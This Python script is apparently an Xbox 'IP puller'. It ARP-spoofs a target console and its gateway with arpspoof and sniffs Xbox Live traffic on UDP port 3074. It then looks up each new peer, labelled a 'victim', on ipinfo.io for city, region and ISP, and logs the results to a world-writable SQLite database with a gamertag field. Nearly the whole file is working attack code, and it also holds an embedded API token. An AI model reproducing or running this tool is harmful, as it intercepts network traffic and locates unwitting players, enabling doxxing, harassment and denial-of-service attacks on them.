from scapy.all import *
import sys
import os
import argparse
import subprocess
import threading
import sqlite3
import urllib.request
import json
import datetime
import npyscreen_database
import npyscreen
import warnings
import time

warnings.simplefilter('ignore')

colors = {
	"red": "\033[31m",
	"green": "\33[92m",
	"red_highlight": "\33[101m",
	"yellow": "\33[33m",
	"endcol": '\033[0m'
}

def_gateway = '192.168.0.1'
xbox_addr = '192.168.0.21'

already_logged = []

class SniffedDatabase(object):

	def __init__(self, fname='a.db'):

		self.dbfname = fname
		self.sDatabase = sqlite3.connect(self.dbfname)
		self.makeDBPublic()
		self.dbcursor = self.sDatabase.cursor()

		
		self.dbcursor.execute(
			"CREATE TABLE IF NOT EXISTS IP_INFO\
			( logID INTEGER PRIMARY KEY,\
			  address TEXT,\
			  state TEXT,\
			  city TEXT,\
			  ISP TEXT,\
			  gamertag TEXT,\
			  date_captured TEXT\
			)"
		)

		self.sDatabase.commit()
		self.sDatabase.close()
		

	def add_sniffed(self, addr='', state='', city='', isp='', gtag='', dcap=''):

		self.sDatabase = sqlite3.connect(self.dbfname)
		self.dbcursor = self.sDatabase.cursor()

		self.dbcursor.execute(
			"INSERT INTO IP_INFO(address, state, city, ISP, gamertag, date_captured)\
			 VALUES (?, ?, ?, ?, ?, ?)"\
			,(addr, state, city, isp, gtag, dcap, )
		)

		self.sDatabase.commit()
		self.sDatabase.close()

	def list_all_records(self):

		self.sDatabase = sqlite3.connect(self.dbfname)
		self.dbcursor = self.sDatabase.cursor()

		self.dbcursor.execute('SELECT * FROM IP_INFO')
		records = self.dbcursor.fetchall()
		self.dbcursor.close()
		return records

	def delete_record(self, logID):

		self.sDatabase = sqlite3.connect(self.dbfname)
		self.dbcursor = self.sDatabase.cursor()

		self.dbcursor.execute('DELETE FROM IP_INFO WHERE logID=?', (logID, ))
		self.sDatabase.commit()
		self.dbcursor.close()


	def update_record(self, logID, addr='', state='', city='', isp='', gtag='', dcap=''):

		self.sDatabase = sqlite3.connect(self.dbfname)
		self.dbcursor = self.sDatabase.cursor()

		self.dbcursor.execute('UPDATE IP_INFO set address=?, state=?, city=?, ISP=?, gamertag=?, date_captured=?\
							WHERE logID=?',\
							(addr, state, city, isp, gtag, dcap, logID))

		self.sDatabase.commit()
		self.dbcursor.close()


	def fetch_row_from_addr(self, addr):

		self.sDatabase = sqlite3.connect(self.dbfname)
		self.dbcursor = self.sDatabase.cursor()

		try:
			self.dbcursor.execute(
				"SELECT * FROM IP_INFO WHERE address=?",\
				(addr, )
				)

			fetchedRow = self.dbcursor.fetchone()
			self.dbcursor.close()
			return fetchedRow

		except:

			print('Unable to fetch row')

	def fetch_row_from_id(self, value):

		self.sDatabase = sqlite3.connect(self.dbfname)
		self.dbcursor = self.sDatabase.cursor()

		try:
			self.dbcursor.execute(
				"SELECT * FROM IP_INFO WHERE logID=?",\
				(value, )
				)

			fetchedRow = self.dbcursor.fetchone()
			self.dbcursor.close()
			return fetchedRow

		except:

			print('Unable to fetch row')


	def makeDBPublic(self):

		os.popen("chmod -R 777 %s" % (self.dbfname))


class MenuOptions(object):
    
	def __init__(self):
	    
	    self.functionList = {} # Dictionary will contain the menu title and function name for each option
	    
	def addFunction(self, title, funcName, arg=None):
	    
	    if(arg):

	    	argString = []

	    	for argument in arg:

	    		argString.append(argument)

    		self.functionList[title] = [funcName, argString]

	    else:
	        self.functionList[title] = funcName
	        #self.functionList[title]() # Runs the function
        
	def selectFunction(self, opt):
    
		for ind, key in enumerate((self.functionList.keys())):

			if isinstance(self.functionList[key], (list, )):

				tmpList = self.functionList[key]
				#print(tmpList)

				if(opt == ind+1):

				    self.functionList[key][0](*tmpList[1])

			else:
				#print(self.functionList[key])
				if(opt == ind+1):

				    self.functionList[key]()

class MainMenu(object):

	def __init__(self):

		pass

	def generateMenu(self, menu_options, ban_gen=False):
     
		while True:
			
			try:

				if(ban_gen):

					print('%s%s%s' % (colors['yellow'], self.generateBanner(), colors['endcol']))

				for ind, key in enumerate(menu_options.functionList.keys()):

					if(ind == 0):
						print('\n')

					print('[%i] %s' % ((ind+1), key))

				userOpt = int(input('\nChoose Option > '))
				menu_options.selectFunction((userOpt))

			except ValueError:

				pass

			except KeyboardInterrupt:

				print('\n%sTaking a step back...%s' % (colors['red'], colors['endcol']))
				break

	def generateBanner(self):

		banner = ''' 
 ____   ____      ____     ___  ____   ____   ____   _____  ____  _
l    j /    T    |    \   /  _]|    \ |    \ l    j / ___/ /    T| T    
 |  T Y   __j    |  D  ) /  [_ |  o  )|  D  ) |  T (   \_ Y  o  || |    
 |  | |  T  |    |    / Y    _]|   _/ |    /  |  |  \__  T|     || l___ 
 |  | |  l_ |    |    \ |   [_ |  |   |    \  |  |  /  \ ||  _  ||     T
 j  l |     |    |  .  Y|     T|  |   |  .  Y j  l  \    ||  |  ||     |
|____jl___,_j    l__j\_jl_____jl__j   l__j\_j|____j  \___jl__j__jl_____j\n'''

		return banner
                                                                        

class SniffHandler():

	def __init__(self):

		self.already_logged = []
		self.geoip_url = "https://ipinfo.io/%s/json?token=861d2d79d48b1d"
		self.ipinfo_url = "https://ipinfo.io/%s/org"
		#self.dbObject = dbObject
		#self.sniffHandlerObject = SniffHandler(self.dbObject)

	def getCurrentTimeStamp(self):

		dtn = datetime.datetime.now()
		return str(dtn)

	def CaptureUDPPackPort(self, pkt, tgtPort):

		if UDP in pkt:

			if pkt[UDP].dport == tgtPort or pkt[UDP].sport == tgtPort:

				currentIP = pkt[IP].dst

				return currentIP

	def CaptureTCPPackPort(self, pkt, tgtPort):

		if TCP in pkt:

			if pkt[TCP].dport == tgtPort or pkt[TCP].sport == tgtPort:

				currentIP = pkt[TCP].dst

				return currentIP

	def ipInfo(self, addr):


		with urllib.request.urlopen(self.ipinfo_url % (addr)) as url_req:

			data = url_req.read().decode('utf-8')
			isp = data

		with urllib.request.urlopen(self.geoip_url % (addr)) as url_req:

			data = url_req.read().decode('utf-8')
			data = json.loads(str(data).strip("b'callback()"))
			data['isp'] = []
			data['isp'].append(isp)
			#print(data['isp'][0])
			return data

	def sniff_xbox(self, pkt):

		self.dbObject = SniffedDatabase()
		currentIP = self.CaptureUDPPackPort(pkt, 3074)

		if(currentIP):

			if(currentIP not in self.already_logged):

				victim_geoip = self.ipInfo(currentIP)
				# Alerts the user that an unlogged IP has been found
				print('\n%s------- Found New Victim: %s ------- %s' % (colors['green'], currentIP, colors['endcol']))
				self.already_logged.append(currentIP)

				#Checks to see if the address exists in database
				fetchedRow = self.dbObject.fetch_row_from_addr(currentIP)

				#If the address exists
				if(fetchedRow):

					#Checks to see if the address is an Xbox Server
					if(fetchedRow[5] != 'Nothing Yet'):

						if(fetchedRow[5] == 'xbox_server'):

							# Pipe some info to stdout
							print(colors['red'] + 'This Server Belongs to Microsoft' + colors['endcol'])

						else:

							print("%sThis IP belongs to: %s%s" % (colors['red_highlight'], fetchedRow[5], colors['endcol']))

				else:

					print(colors['green'] + 'Adding %s to Database...' % (currentIP) + colors['endcol'])
					self.dbObject.add_sniffed(
						currentIP,
						victim_geoip['region'],
						victim_geoip['city'],
						victim_geoip['isp'][0],
						'Nothing Yet',
						self.getCurrentTimeStamp()
						)

				fetchedRow = self.dbObject.fetch_row_from_addr(currentIP)
				print('State or Region of %s: %s' % (currentIP, fetchedRow[2]))
				print('City of %s: %s' % (currentIP, fetchedRow[3]))
				print('ISP of %s: %s%s%s' % (currentIP, colors['yellow'], fetchedRow[4], colors['endcol']))
	



class Application(object):

	def __init__(self):

		self.sniffHandlerObject = SniffHandler()
		#self.ipag = npyscreen_database
		self.xbox_addr = xbox_addr

	def change_ip(self, var_name):

		if(var_name == 'xbox'):

			self.xbox_addr = input('Enter Xbox Address > ') 


	def arp_spoof(self, target_addr, def_gateway, interface='wlp1s0'):

		try:

			# Create two xterm instances for ARP Spoofing target and gateway
			spoof_target = threading.Thread(target=lambda: subprocess.call(["xterm", "-e", ("arpspoof -i %s -t %s %s" % (interface, target_addr, def_gateway))]))
			spoof_gateway = threading.Thread(target=lambda: subprocess.call(["xterm", "-e", ("arpspoof -i %s -t %s %s" % (interface, def_gateway, target_addr))]))

			spoof_target.start()
			spoof_gateway.start()

		except Exception as e:

			print(colors['red'] + str(e))
			print('Unable to start ARP Spoof' + colors['endcol'])

	def myFunction(*args):

	    F = npyscreen.Form(name='My Test Application')
	    F.display()
	    F.edit()


	def start_menu(self, selfObject):

		self.MainOptions = MenuOptions() # Creates options for the main menu
		self.ConfigureOptions = MenuOptions() # Creates options for configuration

		# Creates the menu objects
		FirstMenu = MainMenu()
		ConfMenu = MainMenu()

		# The following populates the options for the Main Menu
		self.MainOptions.addFunction('Start Sniffing', selfObject.run)
		self.MainOptions.addFunction('Open Database Manager', npyscreen.wrapper_basic, [npyscreen_database.executeDBView])
		self.MainOptions.addFunction('Configure Settings', ConfMenu.generateMenu, [self.ConfigureOptions, False])

		# The following populates the options for the Configuration Menu
		self.ConfigureOptions.addFunction('Change Xbox IP', self.change_ip, ['xbox'])
		self.ConfigureOptions.addFunction('Change DB Name', selfObject.run)
		self.ConfigureOptions.addFunction('Change Default Gateway', selfObject.run)

		# Generates each menu using the appropriate options
		print('%s%s%s' % (colors['yellow'], FirstMenu.generateBanner(), colors['endcol']))
		FirstMenu.generateMenu(self.MainOptions, False)


	def run(self):

		self.arp_spoof(self.xbox_addr, def_gateway)
		sniff(filter="", prn=self.sniffHandlerObject.sniff_xbox)


if __name__ == '__main__':

	#print(colors['yellow'] + MainMenu.generateBanner() + colors['endcol'])
	App = Application()
	App.start_menu(App)
	#App.run()

	#print(LinuxCommands.getUname())


#conn = sqlite3.connect('dem_ips.db')
#conn_curs = conn.cursor()

#Create a table
#try:
#	conn_curs.execute('''CREATE TABLE IP_INFO
#		(addr text)''')

#except sqlite3.OperationalError:
#	print('Table Already Exists, connecting...')

#conn_curs.execute('SELECT addr FROM IP_INFO WHERE addr=?', (xbox_addr, ))
#x = conn_curs.fetchone()

'''if(x):

	if(x[0] != xbox_addr):

		print('Adding %s to Database...' % (xbox_addr))
		conn_curs.execute('INSERT INTO IP_INFO VALUES (?)', (xbox_addr, ))'''

'''else:
	print('Adding %s to Database...' % (xbox_addr))
	conn_curs.execute('INSERT INTO IP_INFO VALUES (?, ?, ?, ?)', (xbox_addr, 'special', 'special', 'special', ))'''

#conn.commit()
#conn.close()

#spoof_xbox = threading.Thread(target=lambda: subprocess.call(["xterm", "-e", "arpspoof -i wlp6s0 -t " + xbox_addr + " " + def_gateway]))
#spoof_gateway = threading.Thread(target=lambda: subprocess.call(["xterm", "-e", "arpspoof -i wlp6s0 -t " + def_gateway + " " + xbox_addr]))

#spoof_xbox.start()
#spoof_gateway.start()

'''def return_location(ip):

	with urllib.request.urlopen(geoip_url % (ip)) as url:
		data = url.read().decode('utf-8')
		data = json.loads(str(data).strip("b'callback()"))
		return data'''

#def packet_info(packet):

	#if IP in packet:
	#	print(colors['red'])
	#	print(packet[IP].src)
	#	print(packet[IP].dst)

	#if UDP in packet:

	#	if (packet[UDP].dport == 3074 or packet[UDP].sport == 3074):

			#print(colors['green'] + 'Found an IP: %s' % (packet[IP].dst))
	#		curr_ip = packet[IP].dst

			# if the current ip is not in already logged
	#		if (curr_ip not in already_logged):

				#conn_curs.execute('SELECT gamertag FROM IP_INFO WHERE addr=?', (curr_ip, ))
				#x = conn_curs.fetchone()


				#if(x):
					
				#	if(x[0] == 'xbox_server'):

				#		print(colors['red'] + 'Nope' + colors['endcol'])

				#print(colors['green'] + 'New Victim %s' % (curr_ip) + colors['endcol'])
				#already_logged.append(curr_ip)
				#victim_geoip = return_location(curr_ip)

				#Print Victim Information
				#print('State %s \n' % (victim_geoip['state']))
				#print('City: %s \n' % (victim_geoip['city']))

				#conn_curs.execute('SELECT addr FROM IP_INFO WHERE addr=?', (curr_ip, ))
				#y = conn_curs.fetchone()

				#if(not(y)):

					#print('Adding %s to Database...' % (curr_ip))
					#conn_curs.execute('INSERT INTO IP_INFO VALUES (?, ?, ?, ?)', (curr_ip, victim_geoip['state'], victim_geoip['city'], 'Nothing Yet', ))
					#conn.commit()



	#print(packet.summary())

#this is simply used to test the geoip function
#print(return_location('71.57.113.76'))

#sniffObject = SniffHandler()
#sniff(filter="", prn=packet_info)
#conn.close()